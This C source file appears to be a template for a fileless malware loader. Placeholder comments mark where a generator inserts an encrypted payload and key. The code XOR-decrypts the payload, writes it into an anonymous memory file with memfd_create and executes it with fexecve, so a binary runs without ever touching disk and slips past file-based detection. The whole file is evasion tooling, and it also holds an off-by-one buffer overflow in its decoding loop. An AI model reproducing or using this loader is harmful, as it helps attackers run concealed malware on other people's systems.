#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/syscall.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static inline int memfd_create(const char *name, unsigned int flags) {
  return syscall(__NR_memfd_create, name, flags);
}

int main() {
    //marker
    //var_position 
    int payload_len = sizeof(enc_payload) / sizeof(enc_payload[0]);
    //var_position    
    int key_len = sizeof(key) / sizeof(key[0]);
    char payload[payload_len];
    char thingy[1];

    for(int i = 0; i < payload_len; i++){
        snprintf(thingy, 2, "%c", (enc_payload[i] ^ key[i % key_len]));
        payload[i] = thingy[0];
    }

    int memfd;
    int result; 

    memfd = memfd_create("asdf", MFD_CLOEXEC);
    
    write(memfd, payload, sizeof(payload));

    const char * const argv[] = {"asdf", NULL};
    const char * const envp[] = {NULL};
    fexecve(memfd, (char * const *) argv, (char * const *) envp);
    close(memfd);
    //marker
    return 0;
}
